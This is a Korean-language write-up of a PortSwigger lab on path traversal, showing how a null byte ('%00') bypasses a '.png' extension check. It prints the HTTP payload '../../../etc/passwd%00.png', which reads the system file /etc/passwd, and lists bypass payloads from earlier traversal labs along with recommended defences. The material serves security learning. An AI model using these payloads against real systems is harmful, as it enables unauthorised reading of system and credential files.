# Lab: File path traversal, validation of file extension with null byte bypass

## 개요

- **난이도**: Practitioner
- **주제**: Path Traversal — 파일 확장자 검증 우회 / 널 바이트(`%00`) / 문자열 종료
- **링크**: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

## 목표

애플리케이션이 `filename` 이 `.png`(또는 `.jpg`) 같은 기대 확장자로 끝나는지 검증한다. 널 바이트(`%00`)를 삽입해 확장자 검증은 통과시키고, 하위 계층에서는 문자열이 널 바이트에서 잘려 순회 경로만 사용되도록 만들어 `/etc/passwd` 를 읽는다.

## 이전 랩과의 차이

```
[004 — superfluous URL-decode]
  검증 후 디코딩 → 이중 인코딩으로 ../ 복원

[006 — null byte bypass (이번)]
  확장자(.png) 검증만 수행
  → "../../../etc/passwd%00.png" 로 검증 통과
  → 널 바이트에서 문자열이 종료되어 실제 경로는 ../../../etc/passwd
```

핵심: **검증 로직이 보는 문자열과 파일 시스템 호출이 해석하는 문자열이
널 바이트(`\0`) 이후에서 달라질 때 우회된다.**

## 취약 지점

```http
GET /image?filename=21.png HTTP/1.1
              ↑
       기대 확장자로 끝나는지 검증하는 파라미터
```

서버 내부 처리 (추정):

```c
char *filename = get_param("filename");

/* 확장자 검증: .png 로 끝나는가? */
if (strlen(filename) < 4 ||
    strcmp(filename + strlen(filename) - 4, ".png") != 0) {
    return block();
}

/* 통과 후 그대로 사용 — C 문자열은 \0 에서 끝난다 */
fopen(filename, "rb");
```

`%00`(NULL)은 C 계열 문자열에서 종료 문자(`\0`)로 해석된다.
검증은 전체 버퍼(`...passwd\0.png`)를 보지만, 파일 시스템 호출은 `\0` 앞까지만 사용한다.

## 우회 원리 — 널 바이트 문자열 종료

```
입력:  ../../../etc/passwd%00.png
       └─────────────────┘     └─┘
        실제 경로 (순회)        확장자 검증용

[검증 단계 — 애플리케이션/스크립트 문자열]
  "../../../etc/passwd\0.png"
  마지막 4글자 ".png" → 검증 통과  ✔

[사용 단계 — C 문자열 기반 시스템 호출]
  "../../../etc/passwd\0.png"
                       ↑ 여기서 문자열 종료
  실제 전달: "../../../etc/passwd"

[결과]
  /var/www/images/../../../etc/passwd  →  /etc/passwd  ← 읽기 성공
```

## 공격 단계

### 1단계 — 이미지 요청 캡처

```http
GET /image?filename=21.png HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 2단계 — 확장자 검증 확인

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
→ 확장자 없음 → 차단
```

### 3단계 — 널 바이트로 확장자 붙이기

```http
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

Burp Suite Repeater 에서는 `%00` 을 그대로 입력하면 된다.
(직접 입력 시 실제 널 바이트를 쓰는 것이 아니라 **URL 인코딩 `%00`** 으로 전송)

### 4단계 — 응답 확인

`/etc/passwd` 내용이 그대로 반환되면 랩 해결.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## 널 바이트 주입 기초

```
%00 = NULL = \0 (문자열 종료 문자)

영향을 받는 계층:
  C / C++      strlen, strcmp, fopen 등이 \0 에서 종료
  PHP(<5.3.4)  파일 함수에 널 바이트 주입 가능
  Java         문자열은 \0 를 포함하지만 JNI/네이티브 경유 시 잘릴 수 있음

영향을 받지 않는 계층:
  Python, 최신 PHP, Node.js 등은 널 바이트를 일반 문자로 취급
  → 같은 페이로드가 환경에 따라 동작하지 않을 수 있다

판별 아이디어:
  응답/에러 메시지로 백엔드 언어를 추정하고,
  "\0" 이 문자열 종료로 처리되는 계층인지 확인한다.
```

## 방어

```
[잘못된 방어 — 이번 랩의 취약점]
  if (!filename.endsWith(".png")) 차단
  → 널 바이트로 확장자 검증 통과
  → 파일 시스템 호출은 \0 앞 경로 사용

  if (filename.contains("\0")) 차단  같은 블랙리스트도
  인코딩 변형(%00) 처리 순서에 따라 우회 여지가 있다.

[올바른 방어]
  1. 널 바이트 및 제어문자 거부
     - 입력에서 \0 (0x00) 이 있으면 즉시 거부
  2. 경로 정규화 후 기준 디렉토리 내부인지 화이트리스트 검증
     import os
     base = os.path.realpath("/var/www/images")
     target = os.path.realpath(os.path.join(base, filename))
     if not target.startswith(base + os.sep):
         raise ValueError("허용되지 않은 경로")
  3. 파일명만 허용 (os.path.basename) + 확장자 화이트리스트
  4. 파일명 → ID 매핑으로 임의 경로 입력 자체를 제거
```

## Path Traversal 시리즈 정리

| # | 랩 | 방어 | 우회 |
|---|-----|------|------|
| 001 | simple case | 없음 | `../../../etc/passwd` |
| 002 | absolute path bypass | `../` 차단 | `/etc/passwd` (절대경로) |
| 003 | stripped non-recursively | `../` 1회 제거 | `....//` → `../` 복원 |
| 004 | superfluous URL-decode | 차단 후 URL 디코딩 | `..%252f` 이중 인코딩 |
| 005 | validation of start of path | `/var/www/images` 로 시작 검증 | 접두사 유지 + `../` |
| 006 | extension with null byte | `.png` 확장자 검증 | `../etc/passwd%00.png` |

**공통 교훈**

```
- 입력 문자열 수준의 차단/치환(startswith, endsWith, replace)은 우회 가능
- 검증과 사용 사이에 값이 변하면(인코딩/디코딩, 널 바이트) 우회됨
- 유일하게 견고한 방어는 "디코딩 → 경로 정규화 → 허용 디렉토리 내부인지 검증"
```

## 핵심 정리

- 확장자 검증(`endsWith(".png")`)은 널 바이트(`%00`)로 우회할 수 있다.
- 널 바이트는 C 계열 문자열의 종료 문자이므로, 검증 시점과 파일 시스템 호출 시점의 경로가 달라진다.
- 페이로드는 `../../../etc/passwd%00.png` 이며, 실제 열리는 경로는 `../../../etc/passwd` 가 된다.
- 방어는 널 바이트/제어문자 거부와 경로 정규화 후 기준 디렉토리 검증을 함께 적용해야 한다.

## 배운 점

- 같은 파일 경로라도 "누가(어떤 언어/라이브러리가) 해석하느냐"에 따라 의미가 달라진다.
- 널 바이트는 문자열 종료, 인코딩은 해석 순서 등 계층 간 표현 차이가 우회의 근원이다.
- Path Traversal 6개 랩을 통해 방어는 블랙리스트가 아니라 정규화 + 기준 디렉토리 검증이어야 함을 확인했다.
